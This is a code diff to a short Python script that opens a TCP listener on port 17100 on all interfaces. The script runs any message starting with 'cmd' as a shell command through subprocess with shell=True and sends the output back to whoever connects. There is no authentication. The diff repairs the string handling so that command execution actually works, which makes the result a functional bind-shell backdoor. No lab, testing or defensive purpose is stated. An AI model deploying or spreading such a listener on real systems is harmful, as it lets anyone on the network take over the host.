@@ -1,10 +1,8 @@
 import socket
 import subprocess
 
-# Server setup
-
 HOST = "0.0.0.0"
-PORT = 17100  # Ensure this is within 0-65535
+PORT = 17100 
 
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_socket.bind((HOST, PORT))
@@ -16,20 +14,24 @@ conn, addr = server_socket.accept()
 print(f"Connected by {addr}")
 
 while True:
-    
-    cmd = "cmd"
     data = conn.recv(1024)
     if not data:
         break
-    if data.startswith(cmd):
-        command = data[4:]
+    message = data.decode()
+    if message.startswith("cmd"):
+        command = message[3:].strip()
         try:
-            subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
+            result = subprocess.check_output(
+                command,
+                shell=True,
+                stderr=subprocess.STDOUT,
+                text=True
+            )
         except subprocess.CalledProcessError as e:
             result = e.output
         conn.sendall(result.encode() if result else b'Command executed.\n')
     else:
-        print(f"Received: {data.decode()}")
+        print(f"Received: {message}")
         response = input("Enter response: ")
         conn.sendall(response.encode())
 
